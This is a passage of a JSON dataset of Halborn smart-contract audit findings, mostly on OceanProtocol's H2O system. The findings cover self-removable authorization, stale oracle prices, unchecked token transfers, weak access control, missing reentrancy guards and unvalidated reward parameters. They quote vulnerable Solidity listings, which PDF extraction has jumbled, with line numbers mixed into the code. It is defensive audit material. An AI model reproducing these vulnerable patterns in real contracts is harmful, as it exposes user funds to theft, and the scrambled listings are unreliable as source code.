ERC1155WoonklyNFTRevealWaveFactoryC2.sol - getAddress() (ERC1155WoonklyNFTRevealWaveFactoryC2.sol#63-75) - getAddress() (ERC1155WoonklyNFTRevealWaveFactoryC2.sol#82-94) Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the functions are not intended to be called internally or by their descendants, it is better to mark them as external to reduce gas costs. 22 Remediation Plan: ACKNOWLEDGED: The Woonkly team acknowledges this issue. 23 ",
        "labels": [
            "Halborn",
            "Woonkly_NFT_protocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "AUTHORIZE CAN REMOVE HIMSELF AND ALL OTHER AUTHORIZE ACCOUNT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/OceanProtocol_Priority_H2O_System_Action_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The authorizedAccounts of the contract are the accounts that control In most of the in-scope reflexer-labs all privileged functions. contract, authorizedAccounts can perform privileged actions such as addAuthorization, RemoveAuthorization, ModifyParameters, start , stop (OSM, DSM) etc. . . , the RemoveAuthorization function is used to remove being an authorized account. It is observed that authorizedAccounts can remove himself via the RemoveAuthorization function. As a result, an authorized account could remove authorization before assigning new authorization to another account, which may lead to the contract having no authorized account, eliminating the ability to call privileged functions. Code Location:  Missing validation on the number of authorized accounts left in the system after removing an authorized account  Missing checks to make sure that the addAuthorization function is called before RemoveAuthorization.  No centralized super owner, any authorized account can remove all known account without a secondary confirmation. Listing 1: In-Scope Contracts function addAuthorization ( address account ) virtual external 1  isAuthorized { 2 3 4 5 6 } /* * authorizedAccounts [ account ] = 1; emit AddAuthorization ( account ); * @notice Remove auth from an account 20 * @param account Account to remove auth from */ function removeAuthorization ( address account ) virtual external authorizedAccounts [ account ] = 0; emit RemoveAuthorization ( account ); } /* * * @notice Checks whether msg . sender can call an authed * */ modifier isAuthorized { require ( authorizedAccounts [ msg . sender ] == 1, \" DSM / account - 7 8 9  isAuthorized { 10 11 12 13 14  function 15 16 17  not - authorized \" ); 18 19 _ ; } Risk Level: Likelihood - 1 Impact - 5 Recommendation: It is recommended that the contract authorized accounts cannot call removeAuthorization without transferring the authorization to another address before by calling addAuthorization. In addition, if a multi- signature wallet is used, calling removeAuthorization function should be confirmed by two or more authorized account. Finally, consider adding validation on the number of authorized accounts left in the system after removing an authorized account, make sure that the authorized accounts count is always equal to one or more than one. Remediation Plan: RISK ACCEPTED: The team acknowledged the above issue and claimed that it is the intended behavior of the H2O system and will add the note clarifying the intended functionalities in the README and GitBook documentation. 21 ",
        "labels": [
            "Halborn",
            "OceanProtocol_Priority_H2O_System_Action",
            "Severity: Medium"
        ]
    },
    {
        "title": "USE LATESTROUNDDATA INSTEAD OF LATESTANSWER TO RUN MORE VALIDATIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/OceanProtocol_Priority_H2O_System_Action_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Chainlink contract are calling latestAnswer to get the asset prices. The latestAnswer is deprecated. Freshness of the returned price should be checked, since it affects an accounts health (and therefore liquida- tions). Stale prices that do not reflect the current market price anymore could be used, which would influence the liquidation pricing. This method will return the last value, but you wont be able to check if the data is fresh. On the other hand, calling the method latestRoundData allow you to run some extra validations. Stale prices can put funds in a risk. According to Chainlinks documentation, This function does not error if no answer has been reached but returns 0, causing an incorrect price (https://docs.chain.link/docs/historical- fed to the Price oracle. price-data/#solidity). deprecated. is (https://docs.chain.link/docs/price-feeds-api-reference/)) latestAnswer Furthermore, Code Location: Chainlink Integration Listing 2: Chainlink Integration function read () external view returns ( uint256 ) { // The relayer must not be null require ( address ( chainlinkAggregator ) != address (0) , \" 1 2 3  ChainlinkRelayer / null - aggregator \"); 4 5 6  chainlinkAggregator . latestAnswer () ) , 10 ** uint ( multiplier )) ; 7  latestTimestamp () ; 8 // Fetch values from Chainlink uint256 medianPrice uint256 aggregatorTimestamp = chainlinkAggregator . = multiply ( uint ( 22 require ( both ( medianPrice > 0, subtract ( now , 9  aggregatorTimestamp ) <= staleThreshold ) , \" ChainlinkRelayer / invalid  - price - feed \" ); 10 11 return medianPrice ; } Risk Level: Likelihood - 3 Impact - 3 Recommendation: Implement the following function for checking extra validations. (stale price, incomplete round and return value). Listing 3 ( 1 2 3 4 5 6 7 8 9 10 roundId , rawPrice , , updateTime , answeredInRound ) = _pricefeed () . latestRoundData () ; require ( rawPrice > 0, \" Chainlink price <= 0 \"); require ( updateTime != 0 , \" Incomplete round \" ); require ( answeredInRound >= roundId , \" Stale price \" ); References: Chainlink OpenZeppelin Oracle Article 23 Remediation Plan: SOLVED: The H2O team solved the above issue in the following commits - b6cc5edc266b78a48a1f1f09bd9d229a73619c50 - 3a3ed51516b53d8ed16b703e07452f8edfb5019b - eafcca39e12a33db609bc2a371275fd809e68815 As a result, the team added the additional validation and now uses latestRoundData. 24 ",
        "labels": [
            "Halborn",
            "OceanProtocol_Priority_H2O_System_Action",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNCHECKED TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/OceanProtocol_Priority_H2O_System_Action_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "the contracts GebProxyActions.sol, GebProxyIncentivesActions.sol, GebProxyAuctionActions. In sol, GebProxyLeverageActions.sol, GebProxySaviourActions.sol, the return values of the external transfer calls are not checked. It should be noted that token does not revert in case of failure and return false. If one of these tokens is used, a deposit would not revert if the transfer fails, and an attacker could deposit tokens for free. Code Location: Listing 4: GebProxyActions.sol (Line 149) 147 function coinJoin_join ( address apt , address safeHandler , uint  wad ) public { 148 149 // Gets COIN from the user 's wallet CoinJoinLike ( apt ). systemCoin () . transferFrom ( msg . sender ,  address ( this ) , wad ); 150 151 152 } _coinJoin_join ( apt , safeHandler , wad ); Listing 5: GebProxyAuctionActions.sol (Line 63) 61 62 63  ; 64 function claimProxyFunds ( address tokenAddress ) public { DSTokenLike token = DSTokenLike ( tokenAddress ); token . transfer ( msg . sender , token . balanceOf ( address ( this ))) } Listing 6: GebProxyAuctionActions.sol (Line 286) 278 function settleAuction ( address auctionHouse_ , uint auctionId )  public { 25 279 SurplusAuctionHouseLike auctionHouse =  SurplusAuctionHouseLike ( auctionHouse_ ); 280 DSTokenLike stakedToken = DSTokenLike ( auctionHouse .  stakedToken () ); 281 282 283 284 285 286 // Settle auction auctionHouse . settleAuction ( auctionId ); // Sends the staked tokens to the msg . sender stakedToken . transfer ( msg . sender , stakedToken . balanceOf (  address ( this ))); 287 } Listing 7: GebProxyIncentivesActions.sol (Line 463) 458 function exitAndRemoveLiquidity ( address coinJoin , address  incentives , address uniswapRouter , uint [2] calldata  minTokenAmounts ) external returns ( uint amountA , uint amountB ) { 459 GebIncentivesLike incentivesContract = GebIncentivesLike (  incentives ); 460 DSTokenLike rewardToken = DSTokenLike ( incentivesContract .  rewardsToken () ); 461 DSTokenLike lpToken = DSTokenLike ( incentivesContract .  stakingToken () ); 462 463 incentivesContract . exit () ; rewardToken . transfer ( msg . sender , rewardToken . balanceOf (  address ( this ))); 464 return _removeLiquidityUniswap ( uniswapRouter , address (  CoinJoinLike ( coinJoin ). systemCoin () ) , lpToken . balanceOf ( address (  this )) , msg . sender , minTokenAmounts ); 465 } Listing 8: GebProxyIncentivesActions.sol (Lines 355,356) 350 351 function exitMine ( address incentives ) external { GebIncentivesLike incentivesContract = GebIncentivesLike (  incentives ); 352 DSTokenLike rewardToken = DSTokenLike ( incentivesContract .  rewardsToken () ); 353 DSTokenLike lpToken = DSTokenLike ( incentivesContract .  stakingToken () ); 354 incentivesContract . exit () ; 26 355 rewardToken . transfer ( msg . sender , rewardToken . balanceOf (  address ( this ))); 356 lpToken . transfer ( msg . sender , lpToken . balanceOf ( address (  this ))); 357 } Listing 9: GebProxyIncentivesActions.sol (Line 481) 474 function exitRemoveLiquidityRepayDebt ( address manager , address  coinJoin , uint safe , address incentives , address uniswapRouter ,  uint [2] calldata minTokenAmounts ) external { 475 476 GebIncentivesLike incentivesContract = GebIncentivesLike (  incentives ); 477 DSTokenLike rewardToken = DSTokenLike ( incentivesContract .  rewardsToken () ); 478 DSTokenLike lpToken = DSTokenLike ( incentivesContract .  stakingToken () ); 479 DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 480 481 incentivesContract . exit () ; rewardToken . transfer ( msg . sender , rewardToken . balanceOf (  address ( this ))); 482 483 _removeLiquidityUniswap ( uniswapRouter , address ( systemCoin )  , lpToken . balanceOf ( address ( this )) , address ( this ) , minTokenAmounts  ); 484 485 _repayDebt ( manager , coinJoin , safe , systemCoin . balanceOf (  address ( this )) , false ); 486 487 } msg . sender . call { value : address ( this ). balance }( \"\" ); Listing 10: GebProxyIncentivesActions.sol (Line 336) 319 320 321 322 323 324 325 326 function generateDebtAndProvideLiquidityStake ( address manager , address taxCollector , address coinJoin , address uniswapRouter , address incentives , uint safe , uint wad , 27 327 328 329 uint [2] calldata minTokenAmounts ) external payable { DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 330 _generateDebt ( manager , taxCollector , coinJoin , safe , wad ,  address ( this )); 331 _provideLiquidityUniswap ( coinJoin , uniswapRouter , wad , msg  . value , address ( this ) , minTokenAmounts ); 332 333 334 _stakeInMine ( incentives ); // sending back any leftover tokens / eth , necessary to  manage change from providing liquidity 335 336 msg . sender . call { value : address ( this ). balance }( \"\" ); systemCoin . transfer ( msg . sender , systemCoin . balanceOf (  address ( this ))); 337 } Listing 11: GebProxyIncentivesActions.sol (Line 300) 284 285 286 287 288 289 290 291 292 293 function generateDebtAndProvideLiquidityUniswap ( address manager , address taxCollector , address coinJoin , address uniswapRouter , uint safe , uint wad , uint [2] calldata minTokenAmounts ) external payable { DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 294 _generateDebt ( manager , taxCollector , coinJoin , safe , wad ,  address ( this )); 295 296 _provideLiquidityUniswap ( coinJoin , uniswapRouter , wad , msg  . value , msg . sender , minTokenAmounts ); 297 298 // sending back any leftover tokens / eth , necessary to  manage change from providing liquidity 299 300 msg . sender . call { value : address ( this ). balance }( \"\" ); systemCoin . transfer ( msg . sender , systemCoin . balanceOf (  address ( this ))); 301 } 28 Listing 12: GebProxyIncentivesActions.sol (Line 345) 341 342 function getRewards ( address incentives ) public { GebIncentivesLike incentivesContract = GebIncentivesLike (  incentives ); 343 DSTokenLike rewardToken = DSTokenLike ( incentivesContract .  rewardsToken () ); 344 345 incentivesContract . getReward () ; rewardToken . transfer ( msg . sender , rewardToken . balanceOf (  address ( this ))); 346 } Listing 13: GebProxyIncentivesActions.sol (Line 235) 211 212 213 214 215 216 217 218 219 220 221 222 223 function lockETHGenerateDebtProvideLiquidityStake ( address manager , address taxCollector , address ethJoin , address coinJoin , address uniswapRouter , address incentives , uint safe , uint deltaWad , uint liquidityWad , uint [2] memory minTokenAmounts ) public payable { DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 224 225 _lockETH ( manager , ethJoin , safe , subtract ( msg . value ,  liquidityWad )); 226 227 _generateDebt ( manager , taxCollector , coinJoin , safe ,  deltaWad , address ( this )) ; 228 229 _provideLiquidityUniswap ( coinJoin , uniswapRouter , deltaWad  , liquidityWad , address ( this ) , minTokenAmounts ); 230 231 232 233 _stakeInMine ( incentives ); // sending back any leftover tokens / eth , necessary to  manage change from providing liquidity 234 msg . sender . call { value : address ( this ). balance }( \"\" ); 29 235 systemCoin . transfer ( msg . sender , systemCoin . balanceOf (  address ( this ))); 236 } Listing 14: GebProxyIncentivesActions.sol (Line 158) 137 138 139 140 141 142 143 144 145 146 147 148 function lockETHGenerateDebtProvideLiquidityUniswap ( address manager , address taxCollector , address ethJoin , address coinJoin , address uniswapRouter , uint safe , uint deltaWad , uint liquidityWad , uint [2] calldata minTokenAmounts ) external payable { DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 149 150 _lockETH ( manager , ethJoin , safe , subtract ( msg . value ,  liquidityWad )); 151 152 _generateDebt ( manager , taxCollector , coinJoin , safe ,  deltaWad , address ( this )) ; 153 154 _provideLiquidityUniswap ( coinJoin , uniswapRouter , deltaWad  , liquidityWad , msg . sender , minTokenAmounts ); 155 156 // sending back any leftover tokens / eth , necessary to  manage change from providing liquidity 157 158 msg . sender . call { value : address ( this ). balance }( \"\" ); systemCoin . transfer ( msg . sender , systemCoin . balanceOf (  address ( this ))); 159 } Listing 15: GebProxyIncentivesActions.sol (Line 372) 362 function migrateCampaign ( address _oldIncentives , address  _newIncentives ) external { 363 GebIncentivesLike incentives = GebIncentivesLike (  _oldIncentives ); 30 364 GebIncentivesLike newIncentives = GebIncentivesLike (  _newIncentives ); 365 require ( incentives . stakingToken () == newIncentives .  stakingToken () , \" geb - incentives / mismatched - staking - tokens \"); 366 DSTokenLike rewardToken = DSTokenLike ( incentives .  rewardsToken () ); 367 DSTokenLike lpToken = DSTokenLike ( incentives . stakingToken  () ); 368 369 370 371 372 incentives . exit () ; _stakeInMine ( _newIncentives ); rewardToken . transfer ( msg . sender , rewardToken . balanceOf (  address ( this ))); 373 } Listing 16: GebProxyIncentivesActions.sol (Line 197) 172 173 174 175 176 177 178 179 180 181 182 183 184 185 function openLockETHGenerateDebtProvideLiquidityStake ( address manager , address taxCollector , address ethJoin , address coinJoin , address uniswapRouter , address incentives , bytes32 collateralType , uint256 deltaWad , uint256 liquidityWad , uint256 [2] calldata minTokenAmounts ) external payable returns ( uint safe ) { safe = openSAFE ( manager , collateralType , address ( this )); DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 186 187 _lockETH ( manager , ethJoin , safe , subtract ( msg . value ,  liquidityWad )); 188 189 _generateDebt ( manager , taxCollector , coinJoin , safe ,  deltaWad , address ( this )) ; 190 191 _provideLiquidityUniswap ( coinJoin , uniswapRouter , deltaWad  , liquidityWad , address ( this ) , minTokenAmounts ); 192 193 _stakeInMine ( incentives ); 31 194 195 // sending back any leftover tokens / eth , necessary to  manage change from providing liquidity 196 197 msg . sender . call { value : address ( this ). balance }( \"\" ); systemCoin . transfer ( msg . sender , systemCoin . balanceOf (  address ( this ))); 198 } Listing 17: GebProxyIncentivesActions.sol (Line 124) 102 103 104 105 106 107 108 109 110 111 112 113 114 function openLockETHGenerateDebtProvideLiquidityUniswap ( address manager , address taxCollector , address ethJoin , address coinJoin , address uniswapRouter , bytes32 collateralType , uint deltaWad , uint liquidityWad , uint [2] calldata minTokenAmounts ) external payable returns ( uint safe ) { safe = openSAFE ( manager , collateralType , address ( this )); DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 115 116 _lockETH ( manager , ethJoin , safe , subtract ( msg . value ,  liquidityWad )); 117 118 _generateDebt ( manager , taxCollector , coinJoin , safe ,  deltaWad , address ( this )) ; 119 120 _provideLiquidityUniswap ( coinJoin , uniswapRouter , deltaWad  , liquidityWad , msg . sender , minTokenAmounts ); 121 122 // sending back any leftover tokens / eth , necessary to  manage change from providing liquidity 123 124 msg . sender . call { value : address ( this ). balance }( \"\" ); systemCoin . transfer ( msg . sender , systemCoin . balanceOf (  address ( this ))); 125 } 32 Listing 18: GebProxyIncentivesActions.sol (Lines 266,273) 258 259 260 261 262 263 264 265 function provideLiquidityStake ( address coinJoin , address uniswapRouter , address incentives , uint wad , uint [2] memory minTokenAmounts ) public payable { DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 266 267 systemCoin . transferFrom ( msg . sender , address ( this ) , wad ); _provideLiquidityUniswap ( coinJoin , uniswapRouter , wad , msg  . value , address ( this ) , minTokenAmounts ); 268 269 270 271 _stakeInMine ( incentives ); // sending back any leftover tokens / eth , necessary to  manage change from providing liquidity 272 273 msg . sender . call { value : address ( this ). balance }( \"\" ); systemCoin . transfer ( msg . sender , systemCoin . balanceOf (  address ( this ))); 274 } Listing 19: GebProxyIncentivesActions.sol (Lines 245,250) 243 function provideLiquidityUniswap ( address coinJoin , address  uniswapRouter , uint wad , uint [2] calldata minTokenAmounts )  external payable { 244 DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 245 246 systemCoin . transferFrom ( msg . sender , address ( this ) , wad ); _provideLiquidityUniswap ( coinJoin , uniswapRouter , wad , msg  . value , msg . sender , minTokenAmounts ); 247 248 // sending back any leftover tokens / eth , necessary to  manage change from providing liquidity 249 250 msg . sender . call { value : address ( this ). balance }( \"\" ); systemCoin . transfer ( msg . sender , systemCoin . balanceOf (  address ( this ))); 251 } 33 Listing 20: GebProxyIncentivesActions.sol (Line 419) 418 function removeLiquidityUniswap ( address uniswapRouter , address  systemCoin , uint value , uint [2] calldata minTokenAmounts )  external returns ( uint amountA , uint amountB ) { 419 DSTokenLike ( getWethPair ( uniswapRouter , systemCoin )) .  transferFrom ( msg . sender , address ( this ) , value ); 420 return _removeLiquidityUniswap ( uniswapRouter , systemCoin ,  value , msg . sender , minTokenAmounts ); 421 } Listing 21: GebProxyIncentivesActions.sol (Line 307) 306 307 function stakeInMine ( address incentives , uint wad ) external { DSTokenLike ( GebIncentivesLike ( incentives ). stakingToken () ).  transferFrom ( msg . sender , address ( this ) , wad ); _stakeInMine ( incentives ); 308 309 } Listing 22: GebProxyIncentivesActions.sol (Line 394) 388 function withdrawAndHarvest ( address incentives , uint value )  external { 389 GebIncentivesLike incentivesContract = GebIncentivesLike (  incentives ); 390 DSTokenLike rewardToken = DSTokenLike ( incentivesContract .  rewardsToken () ); 391 DSTokenLike lpToken = DSTokenLike ( incentivesContract .  stakingToken () ); 392 393 394 incentivesContract . withdraw ( value ); getRewards ( incentives ); lpToken . transfer ( msg . sender , lpToken . balanceOf ( address (  this ))); 395 } Listing 23: GebProxyIncentivesActions.sol (Line 382) 378 function withdrawFromMine ( address incentives , uint value )  external { 379 GebIncentivesLike incentivesContract = GebIncentivesLike (  incentives ); 34 380 DSTokenLike lpToken = DSTokenLike ( incentivesContract .  stakingToken () ); 381 382 incentivesContract . withdraw ( value ); lpToken . transfer ( msg . sender , lpToken . balanceOf ( address (  this ))); 383 } Listing 24: GebProxyIncentivesActions.sol (Line 409) 403 function withdrawHarvestRemoveLiquidity ( address incentives ,  address uniswapRouter , address systemCoin , uint value , uint [2]  memory minTokenAmounts ) public returns ( uint amountA , uint amountB  ) { 404 GebIncentivesLike incentivesContract = GebIncentivesLike (  incentives ); 405 DSTokenLike rewardToken = DSTokenLike ( incentivesContract .  rewardsToken () ); 406 DSTokenLike lpToken = DSTokenLike ( incentivesContract .  stakingToken () ); 407 408 409 incentivesContract . withdraw ( value ); getRewards ( incentives ); rewardToken . transfer ( msg . sender , rewardToken . balanceOf (  address ( this ))); 410 return _removeLiquidityUniswap ( uniswapRouter , systemCoin ,  lpToken . balanceOf ( address ( this )) , msg . sender , minTokenAmounts ); 411 } Listing 25: GebProxyIncentivesActions.sol (Line 449) 441 function withdrawRemoveLiquidityRepayDebt ( address manager ,  address coinJoin , uint safe , address incentives , uint value ,  address uniswapRouter , uint [2] calldata minTokenAmounts ) external  { 442 GebIncentivesLike incentivesContract = GebIncentivesLike (  incentives ); 443 DSTokenLike rewardToken = DSTokenLike ( incentivesContract .  rewardsToken () ); 444 DSTokenLike systemCoin = DSTokenLike ( CoinJoinLike ( coinJoin  ). systemCoin () ); 445 446 447 incentivesContract . withdraw ( value ); _removeLiquidityUniswap ( uniswapRouter , address ( systemCoin )  , value , address ( this ) , minTokenAmounts ); 35 448 _repayDebt ( manager , coinJoin , safe , systemCoin . balanceOf (  address ( this )) , false ); 449 rewardToken . transfer ( msg . sender , rewardToken . balanceOf (  address ( this ))); 450 451 } msg . sender . call { value : address ( this ). balance }( \"\" ); Listing 26: GebProxyLeverageActions.sol (Line 44) function uniswapV2Call ( address _sender , uint _amount0 , uint require ( _sender == proxy , \" invalid sender \"); require ( msg . sender == uniswapPair , \" invalid uniswap pair \" ) // transfer coins ( address _tokenBorrow ,, ,,,, , address _proxy ) = abi . decode ( 38  _amount1 , bytes calldata _data ) external { 39 40  ; 41 42 43  _data , ( address , uint , address , bool , bool , bytes , address ,  address )); 44  _amount0 : _amount1 ); 45 46 47  execute ( address , bytes ) \" , _proxy , msg . data )) ; 48 49 // call proxy ( bool success ,) = proxy . call ( abi . encodeWithSignature (\" DSTokenLike ( _tokenBorrow ). transfer ( proxy , ( _amount0 > 0) ? require ( success , \" \"); } Listing 27: GebProxyLeverageActions.sol (Line 151) 113 function uniswapV2Call ( address _sender , uint /* _amount0 */ ,  uint /* _amount1 */ , bytes calldata _data ) external { 114 require ( _sender == address ( this ) , \" only this contract may  initiate \" ); 115  ); 116 117 118 119 120 121 122 DSAuth ( address ( this )) . setAuthority ( DSAuthority ( address (0) ) // decode data ( address _tokenBorrow , uint _amount , address _tokenPay , bool _isBorrowingEth , 36 123 124 125 126 127 bool _isPayingEth , bytes memory _userData , address weth , // address proxy ) = abi . decode ( _data , ( address , uint , address , bool , bool ,  bytes , address , address )) ; 128 129 130 131 132 133 134 135 // unwrap WETH if necessary if ( _isBorrowingEth ) { WethLike ( weth ). withdraw ( _amount ); } // compute the amount of _tokenPay that needs to be repaid // address pairAddress = permissionedPairAddress ; // gas  efficiency 136 uint pairBalanceTokenBorrow = DSTokenLike ( _tokenBorrow ).  balanceOf ( FlashSwapProxy ( msg . sender ). uniswapPair () ); 137 uint pairBalanceTokenPay = DSTokenLike ( _tokenPay ).  balanceOf ( FlashSwapProxy ( msg . sender ). uniswapPair () ); 138 uint amountToRepay = ((1000 * pairBalanceTokenPay *  _amount ) / (997 * pairBalanceTokenBorrow )) + 1; 139 140 141 142 // do whatever the user wants if ( _isBorrowingEth ) flashLeverageCallback ( _amount , amountToRepay ,  _userData ); 143 144 else  _userData ); flashDeleverageCallback ( _amount , amountToRepay , 145 146 147 148 149 150 151 // payback loan // wrap ETH if necessary if ( _isPayingEth ) { WethLike ( weth ). deposit { value : amountToRepay }() ; } DSTokenLike ( _tokenPay ). transfer ( FlashSwapProxy ( msg . sender )  . uniswapPair () , amountToRepay ); 152 } Listing 28: GebProxySaviourActions.sol (Line 45) function transferTokenFromAndApprove ( address token , address 44  target , uint256 amount ) internal { 37 45  amount ); 46 47 48 } DSTokenLike ( token ). transferFrom ( msg . sender , address ( this ) , DSTokenLike ( token ). approve ( target , 0) ; DSTokenLike ( token ). approve ( target , amount ); Listing 29: GebProxySaviourActions.sol (Line 59) function transferTokensToCaller ( address [] memory tokens ) for ( uint i = 0; i < tokens . length ; i ++) { uint256 selfBalance = DSTokenLike ( tokens [ i ]) . balanceOf if ( selfBalance > 0) { DSTokenLike ( tokens [i ]) . transfer ( msg . sender , 55  public { 56 57  ( address ( this )); 58 59  selfBalance ); 60 } 61 62 } } Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to use SafeERC20, or ensure that the transfer return value is checked. Remediation Plan: RISK ACCEPTED: The H2O team accepts the risk of this issue, claiming that all tokens in the system, i.e., the OCEAN collateral token, the stable coin and the governance token will be used in production revert on failure. Moreover, the team will add WARNING documentation to warn downstream users to use the H2O system only with tokens that revert to the failure. 38 ",
        "labels": [
            "Halborn",
            "OceanProtocol_Priority_H2O_System_Action",
            "Severity: Medium"
        ]
    },
    {
        "title": "IMPROPER ACCESS CONTROL POLICY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/OceanProtocol_Priority_H2O_System_Action_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Implementing a valid Access Control policy in smart contracts is es- sential to maintain security and decentralize permissions on a token. Moreover, access Control gives the features to mint/burn tokens and pause contracts. For instance, Ownership is the most common form of Access Con- trol. In other words, the owner of a contract (the account that deployed Nevertheless, it by default) can do some administrative tasks on it. different authorization levels are required to keep the principle of least privilege, also known as least authority. Briefly, any process, user, or program can only access the necessary resources or information. Otherwise, the ownership role is beneficial in simple systems, but more complex projects require more roles using Role-based access control. In most scope contracts, The authorizedAccounts of the contract are the accounts that control all privileged functions. Everything is managed and controlled by the Authorized accounts, with no other access control. If this account is compromised, then all functionalities would be controlled by an attacker, such as removing all other authorized accounts, changing price source to a malicious address, restarting feed and setting it to 0, starting and stopping the DSM OSM, etc. Code Location: Listing 30: In-Scope Contracts 1 2 constructor ( address priceSource_ ) public { authorizedAccounts [ msg . sender ] = 1; Listing 31: In-Scope Contracts 1 2 constructor ( address priceSource_ , uint256 deviation ) public { require ( deviation > 0 && deviation < WAD , \" DSM / invalid - 39  deviation \"); 3 4 authorizedAccounts [ msg . sender ] = 1; Risk Level: Likelihood - 2 Impact - 4 Recommendation: Its recommended to use role-based access control based on the principle of least privilege to lock permissioned functions using different roles. For example, use authorized account to manage permission only, where it could use other roles to manage other critical functionalities such as DSM OSM role to start, stop DSM OSM, etc. References: Least Privilege OpenZeppelin Access Control Remediation Plan: PENDING: The team will fix the issue in a future release adding the below points. - In case externally owned accounts (EOAs) are the authorized accounts, the team will implement RBAC according to the software engineering princi- ple of separation of concerns by authorizing only a single proxy contract and implementing RBAC in the proxy contract configuration. For example, the DSRoles proxy contract implements permissions at an address method signature level. - In other cases, if a smart contract is the authorized account; the team will only authorize smart contracts for which the code is known and trusted in advance. 40 ",
        "labels": [
            "Halborn",
            "OceanProtocol_Priority_H2O_System_Action",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/OceanProtocol_Priority_H2O_System_Action_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was identified that some in-scope contracts of H2O branch are miss- ing nonReentrant guard. In these function, write of persistent state and external calls following an external call is identified, making it vulnerable to a Reentrancy attack.  DebtCeilingProposal.sol contract function executeProposal missing nonReentrant guard.  GlobalAuctionParamsProposal.sol contract function executeProposal missing nonReentrant guard.  GlobalSettlementProposal.sol missing nonReentrant guard. contract function executeProposal To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against the Reentrancy attacks. Code Location:  state change executed = true following an external call pause. executeTransaction Listing 32: DebtCeilingProposal.sol (Lines 70,72) function executeProposal () public { // exec require (! executed , \" proposal - already - executed \" ); 67 68 69 70  earliestExecutionTime ); pause . executeTransaction ( target , codeHash , signature , 41 71 72 73 } executed = true ; Listing 33: GlobalAuctionParamsProposal.sol (Lines 86,94,96) function executeProposal () public { require (! executed , \" proposal - already - executed \" ); bytes memory signature = abi . encodeWithSignature ( \" modifyParameters ( address , bytes32 , uint256 )\" , accountingEngine , bytes32 (\" initialDebtAuctionMintedTokens \" ) , initialDebtMintedTokens ); pause . executeTransaction ( target , codeHash , signature , signature = abi . encodeWithSignature ( \" modifyParameters ( address , bytes32 , uint256 )\" , accountingEngine , bytes32 (\" debtAuctionBidSize \") , debtAuctionBidSize ); pause . executeTransaction ( target , codeHash , signature , 76 77 78 79 80 81 82 83 84 85 86  earliestExecutionTime ); 87 88 89 90 91 92 93 94  earliestExecutionTime ); 95 96 97 } executed = true ; 57 58 59 60 61  globalSettlement ); 62 63  earliestExecutionTime ); 64 Listing 34: GlobalSettlementProposal.sol (Lines 63,65) function executeProposal () public { require (! executed , \" proposal - already - executed \" ); bytes memory signature = abi . encodeWithSignature ( \" shutdownSystem ( address )\" , pause . executeTransaction ( target , codeHash , signature , 42 65 66 } executed = true ; Risk Level: Likelihood - 3 Impact - 3 Recommendation: Change the code to follow the checks-effects-interactions pattern and use ReentrancyGuard through the nonReentrant modifier. Remediation Plan: the in result, the The H2O team SOLVED: 384b866ebf808831d3f5980f4f4f62dc17d9365d. added the nonReentrant modifier. solved the above issue a As commit team 43 ",
        "labels": [
            "Halborn",
            "OceanProtocol_Priority_H2O_System_Action",
            "Severity: Medium"
        ]
    },
    {
        "title": "AUTHORIZE ACCOUNT CAN SET INVALID BASE AND MAX REWARDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/OceanProtocol_Priority_H2O_System_Action_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the scope contract FSMWrapper.sol, OSM.sol and DSM.sol, it is observed that the authorize accounts can set max and base rewards to an invalid value such as 0. It is possible, as no minimum and maximum value validation on the state variable baseUpdateCallerReward and maxUpdateCallerReward is performed. Code Location:  Authorize accounts calling modifyParameters with byte32 value of baseUpdateCallerReward as a parameter and val as 0 sets baseUpdateCallerReward to 0. After this, call modifyParameters with byte32 value of maxUpdateCallerReward as a parameter and val as 0 sets maxUpdateCallerReward to 0. Listing 35: FSMWrapper.sol, OSM.sol and DSM.sol function modifyParameters ( bytes32 parameter , uint256 val ) 1  external isAuthorized { 2 3  invalid - base - caller - reward \"); 4 5 6 7  invalid - max - caller - reward \" ); 8 9 } if ( parameter == \" baseUpdateCallerReward \" ) { require ( val <= maxUpdateCallerReward , \" FSMWrapper / baseUpdateCallerReward = val ; } else if ( parameter == \" maxUpdateCallerReward \" ) { require ( val >= baseUpdateCallerReward , \" FSMWrapper / maxUpdateCallerReward = val ; 44 Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider declaring a state variable that can store baseUpdateCallerReward and maxUpdateCallerReward rewards minimum and maximum value. Add the require check to make sure supplied val for baseUpdateCallerReward and maxUpdateCallerReward parameter lies within the min and max value. Remediation Plan: RISK ACCEPTED: The H2O team accepts the 